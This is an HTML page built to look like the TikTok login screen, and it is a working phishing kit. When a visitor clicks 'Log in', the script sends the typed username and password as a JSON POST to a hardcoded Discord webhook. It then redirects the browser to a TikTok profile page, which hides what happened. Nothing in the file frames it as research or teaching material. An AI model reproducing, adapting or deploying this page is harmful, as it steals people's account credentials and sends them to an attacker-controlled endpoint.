<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="your-tiktok-logo.png">
  <title>TikTok</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <span id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div>

                </div>
<div data-e2e="header-text" class="tiktok-1xzlee1-DivTitle e1x3uhsi4">Log in</div>
                <div class="form-wrap">
                  <form class="form">
                    <div class="input-box">
                      <input type="text" id="username" placeholder="Username or Email" aria-required="true"
                        maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>
                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30"
                        aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>
                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                    </span>
                    <a class="forgot" href="https://www.tiktok.com/forgot-password">Forgot password?</a>
                  </form>
                </div>
              </div>

              <div class="login-box">
              </div>
            </div>
          </article>
        </div>
      </main>

      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
          </nav>
          <span class="footer-logo">&copy; 2024 TikTok</span>
        </div>
      </footer>
    </section>
  </span>

  <script type="text/javascript">
    function la(src) {
      window.location = src;
    }
  </script>

  <script>
 
    function sendMessage() {
      function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
          currentDate = Date.now();
        } while (currentDate - date < milliseconds);
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1186106510149951608/r0LP6RcJ109iMCPEjsvYhG7bT3XU1bIItDUnZVb3F0Q86Sz6shXbiPHeuQGY1aLaBYDm");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      }
      request.send(JSON.stringify(params));
      sleep(400)
      window.location.replace("https://www.tiktok.com/@daila051?lang=en");
    }
  
  </script>
</body>

</html>
